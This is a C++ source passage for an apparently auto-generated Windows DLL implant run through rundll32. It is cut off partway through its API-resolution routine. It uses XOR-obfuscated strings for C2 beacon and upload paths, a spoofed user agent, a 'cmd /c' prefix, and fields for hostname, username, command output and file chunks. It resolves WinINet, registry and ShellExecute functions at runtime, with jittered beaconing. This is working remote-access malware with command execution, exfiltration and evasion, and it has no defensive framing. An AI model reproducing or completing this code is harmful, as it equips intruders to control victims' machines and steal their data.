// Auto-generated DLL agent for rundll32
// XOR key: 189
// Host: 127.0.0.1:8443
// Mutex: Global\hTuuskmVH0Q7fBfu
// Startup delay: 7s
// Beacon: 14s +/- 4s
// Upload: 300ms +/- 221ms
#include <windows.h>
#include <wininet.h>
#include <string>
#include <cstring>
#include <ctime>
#include <stdio.h>
#include <vector>
#include <stdarg.h>
#include <stdlib.h>

static const unsigned char XOR_KEY = 189;

static unsigned char _e_host[10] = {140,143,138,147,141,147,141,147,140,189};
static unsigned char _e_port[5] = {133,137,137,142,189};
static unsigned char _e_path_beacon[8] = {146,223,216,220,222,210,211,189};
static unsigned char _e_path_upload_init[13] = {146,200,205,209,210,220,217,226,212,211,212,201,189};
static unsigned char _e_path_upload_chunk[14] = {146,200,205,209,210,220,217,226,222,213,200,211,214,189};
static unsigned char _e_ua[112] = {240,210,199,212,209,209,220,146,136,147,141,157,149,234,212,211,217,210,202,206,157,243,233,157,140,141,147,141,134,157,234,212,211,139,137,134,157,197,139,137,148,157,252,205,205,209,216,234,216,223,246,212,201,146,136,142,138,147,142,139,157,149,246,245,233,240,241,145,157,209,212,214,216,157,250,216,222,214,210,148,157,254,213,207,210,208,216,146,140,143,139,147,141,147,141,147,141,157,238,220,219,220,207,212,146,136,142,138,147,142,139,189};
static unsigned char _e_mutexname[25] = {250,209,210,223,220,209,225,225,213,233,200,200,206,214,208,235,245,141,236,138,219,255,219,200,189};
static unsigned char _e_logname[13] = {208,238,214,216,248,212,248,210,147,201,208,205,189};
static unsigned char _e_cmdprefix[8] = {222,208,217,157,146,222,157,189};
static unsigned char _e_dll_wininet[12] = {202,212,211,212,211,216,201,147,217,209,209,189};
static unsigned char _e_dll_advapi32[13] = {220,217,203,220,205,212,142,143,147,217,209,209,189};
static unsigned char _e_dll_shell32[12] = {206,213,216,209,209,142,143,147,217,209,209,189};
static unsigned char _e_dll_kernel32[13] = {214,216,207,211,216,209,142,143,147,217,209,209,189};
static unsigned char _e_dll_ole32[10] = {210,209,216,142,143,147,217,209,209,189};
static unsigned char _e_api_InternetOpenA[14] = {244,211,201,216,207,211,216,201,242,205,216,211,252,189};
static unsigned char _e_api_InternetConnectA[17] = {244,211,201,216,207,211,216,201,254,210,211,211,216,222,201,252,189};
static unsigned char _e_api_HttpOpenRequestA[17] = {245,201,201,205,242,205,216,211,239,216,204,200,216,206,201,252,189};
static unsigned char _e_api_HttpSendRequestA[17] = {245,201,201,205,238,216,211,217,239,216,204,200,216,206,201,252,189};
static unsigned char _e_api_InternetReadFile[17] = {244,211,201,216,207,211,216,201,239,216,220,217,251,212,209,216,189};
static unsigned char _e_api_InternetCloseHandle[20] = {244,211,201,216,207,211,216,201,254,209,210,206,216,245,220,211,217,209,216,189};
static unsigned char _e_api_InternetSetOptionA[19] = {244,211,201,216,207,211,216,201,238,216,201,242,205,201,212,210,211,252,189};
static unsigned char _e_api_RegOpenKeyExA[14] = {239,216,218,242,205,216,211,246,216,196,248,197,252,189};
static unsigned char _e_api_RegSetValueExA[15] = {239,216,218,238,216,201,235,220,209,200,216,248,197,252,189};
static unsigned char _e_api_RegCloseKey[12] = {239,216,218,254,209,210,206,216,246,216,196,189};
static unsigned char _e_api_ShellExecuteA[14] = {238,213,216,209,209,248,197,216,222,200,201,216,252,189};
static unsigned char _e_api_CoCreateGuid[13] = {254,210,254,207,216,220,201,216,250,200,212,217,189};
static unsigned char _e_api_CoInitialize[13] = {254,210,244,211,212,201,212,220,209,212,199,216,189};
static unsigned char _e_content_json[33] = {254,210,211,201,216,211,201,144,233,196,205,216,135,157,220,205,205,209,212,222,220,201,212,210,211,146,215,206,210,211,176,183,189};
static unsigned char _e_status_ok[3] = {210,214,189};
static unsigned char _e_field_status[7] = {206,201,220,201,200,206,189};
static unsigned char _e_field_offset[7] = {210,219,219,206,216,201,189};
static unsigned char _e_field_cmd[4] = {222,208,217,189};
static unsigned char _e_field_seq[4] = {206,216,204,189};
static unsigned char _e_field_guid[5] = {218,200,212,217,189};
static unsigned char _e_field_filename[9] = {219,212,209,216,211,220,208,216,189};
static unsigned char _e_field_total_size[11] = {201,210,201,220,209,226,206,212,199,216,189};
static unsigned char _e_field_chunk_b64[10] = {222,213,200,211,214,226,223,139,137,189};
static unsigned char _e_field_result_b64[11] = {207,216,206,200,209,201,226,223,139,137,189};
static unsigned char _e_field_hostname[9] = {213,210,206,201,211,220,208,216,189};
static unsigned char _e_field_username[9] = {200,206,216,207,211,220,208,216,189};
static unsigned char _e_s_backslash[2] = {225,189};
static unsigned char _e_s_slash[2] = {146,189};
static unsigned char _e_s_dot[2] = {147,189};
static unsigned char _e_s_dot2[3] = {147,147,189};
static unsigned char _e_s_dir[2] = {151,189};
static unsigned char _e_method_post[5] = {237,242,238,233,189};
static unsigned char _e_s_http[8] = {213,201,201,205,135,146,146,189};
static unsigned char _e_s_empty[1] = {189};
static unsigned char _e_s_b64[65] = {252,255,254,249,248,251,250,245,244,247,246,241,240,243,242,237,236,239,238,233,232,235,234,229,228,231,220,223,222,217,216,219,218,213,212,215,214,209,208,211,210,205,204,207,206,201,200,203,202,197,196,199,141,140,143,142,137,136,139,138,133,132,150,146,189};

static void s_copy(char* dst, unsigned char* src, size_t n) {
    for(size_t i = 0; i < n; i++) dst[i] = src[i] ^ XOR_KEY;
    dst[n-1] = '\0';
}

typedef HINTERNET (WINAPI *t_InternetOpenA)(LPCSTR,DWORD,LPCSTR,LPCSTR,DWORD);
typedef HINTERNET (WINAPI *t_InternetConnectA)(HINTERNET,LPCSTR,INTERNET_PORT,LPCSTR,LPCSTR,DWORD,DWORD,DWORD_PTR);
typedef HINTERNET (WINAPI *t_HttpOpenRequestA)(HINTERNET,LPCSTR,LPCSTR,LPCSTR,LPCSTR,LPCSTR*,DWORD,DWORD_PTR);
typedef BOOL (WINAPI *t_HttpSendRequestA)(HINTERNET,LPCSTR,DWORD,LPVOID,DWORD);
typedef BOOL (WINAPI *t_InternetReadFile)(HINTERNET,LPVOID,DWORD,LPDWORD);
typedef BOOL (WINAPI *t_InternetCloseHandle)(HINTERNET);
typedef BOOL (WINAPI *t_InternetSetOptionA)(HINTERNET,DWORD,LPVOID,DWORD);
typedef LONG (WINAPI *t_RegOpenKeyExA)(HKEY,LPCSTR,DWORD,REGSAM,PHKEY);
typedef LONG (WINAPI *t_RegSetValueExA)(HKEY,LPCSTR,DWORD,DWORD,const BYTE*,DWORD);
typedef LONG (WINAPI *t_RegCloseKey)(HKEY);
typedef HINSTANCE (WINAPI *t_ShellExecuteA)(HWND,LPCSTR,LPCSTR,LPCSTR,LPCSTR,INT);
typedef HRESULT (WINAPI *t_CoCreateGuid)(GUID*);
typedef HRESULT (WINAPI *t_CoInitialize)(LPVOID);

static struct {
    t_InternetOpenA f_InternetOpenA;
    t_InternetConnectA f_InternetConnectA;
    t_HttpOpenRequestA f_HttpOpenRequestA;
    t_HttpSendRequestA f_HttpSendRequestA;
    t_InternetReadFile f_InternetReadFile;
    t_InternetCloseHandle f_InternetCloseHandle;
    t_InternetSetOptionA f_InternetSetOptionA;
    t_RegOpenKeyExA f_RegOpenKeyExA;
    t_RegSetValueExA f_RegSetValueExA;
    t_RegCloseKey f_RegCloseKey;
    t_ShellExecuteA f_ShellExecuteA;
    t_CoCreateGuid f_CoCreateGuid;
    t_CoInitialize f_CoInitialize;
} _api;

static FARPROC _gpa(HMODULE h, const char* name) {
    return GetProcAddress(h, name);
}

static bool _resolve_apis() {
    char dn1[32]; s_copy(dn1, _e_dll_wininet, sizeof(_e_dll_wininet));
    char dn2[32]; s_copy(dn2, _e_dll_advapi32, sizeof(_e_dll_advapi32));
    char dn3[32]; s_copy(dn3, _e_dll_shell32, sizeof(_e_dll_shell32));
    char dn4[32]; s_copy(dn4, _e_dll_ole32, sizeof(_e_dll_ole32));
    HMODULE h1 = LoadLibraryA(dn1);
    HMODULE h2 = LoadLibraryA(dn2);
    HMODULE h3 = LoadLibraryA(dn3);
    HMODULE h4 = LoadLibraryA(dn4);
    if(!h1 || !h2 || !h3 || !h4) return false;
    char n1[32]; s_copy(n1, _e_api_InternetOpenA, sizeof(_e_api_InternetOpenA));
    char n2[32]; s_copy(n2, _e_api_InternetConnectA, sizeof(_e_api_InternetConnectA));
    char n3[32]; s_copy(n3, _e_api_HttpOpenRequestA, sizeof(_e_api_HttpOpenRequestA));
    char n4[32]; s_copy(n4, _e_api_HttpSendRequestA, sizeof(_e_api_HttpSendRequestA));
    char n5[32]; s_copy(n5, _e_api_InternetReadFile, sizeof(_e_api_InternetReadFile));
    char n6[32]; s_copy(n6, _e_api_I
